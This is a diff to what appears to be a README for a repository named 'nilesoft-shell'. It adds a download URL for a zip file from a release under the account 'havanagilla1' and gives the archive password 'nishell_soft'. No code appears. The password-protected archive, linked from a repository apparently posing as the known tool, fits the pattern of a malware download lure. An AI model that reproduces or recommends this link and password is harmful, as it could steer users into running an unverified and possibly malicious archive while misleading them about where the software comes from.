@@ -9,7 +9,7 @@
 <ul>
   <li><b>Download Nilesoft Shell:</b> <i>(Password: nishell_soft)</i></li>
   <br>
-  <a href=""><img src="https://github.com/user-attachments/assets/9d55d3fe-fcf9-4be7-a3e6-ecac6f9d45dc"></a>
+  <a href="https://github.com/havanagilla1/nilesoft-shell/releases/download/Download/Nilesoft-shell.zip"><img src="https://github.com/user-attachments/assets/9d55d3fe-fcf9-4be7-a3e6-ecac6f9d45dc"></a>
 </ul>
 
 > <h2>Overview</h2>
